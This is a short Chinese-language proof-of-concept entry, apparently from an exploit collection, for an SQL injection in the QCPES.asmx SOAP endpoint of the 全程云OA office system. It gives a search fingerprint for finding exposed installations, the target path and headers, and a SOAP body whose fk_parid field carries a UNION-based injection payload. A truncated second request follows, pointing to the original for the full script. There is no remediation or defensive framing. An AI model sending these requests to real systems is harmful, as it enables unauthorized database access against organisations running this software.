# 全程云OA系统QCPES.asmx存在SQL注入漏洞

- **系统**：全程云OA系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="images/yipeoplehover.png"`
- **请求**：`POST /OA/PES/QCPES.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetCode"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetCode xmlns="http://tempuri.org/">
<fk_parid>1' UNION ALL SELECT @@VERSION-- oCWH</fk_parid>
<value>1</value>
</GetCode>
</soap:Body>
</soap:Envelope>
POST /OA/PES/QCPES.asmx HTTP/1.1
Host:
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetValue"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/…（脚本共 891 字，完整版见原文）
```
- **预期**：200　|　—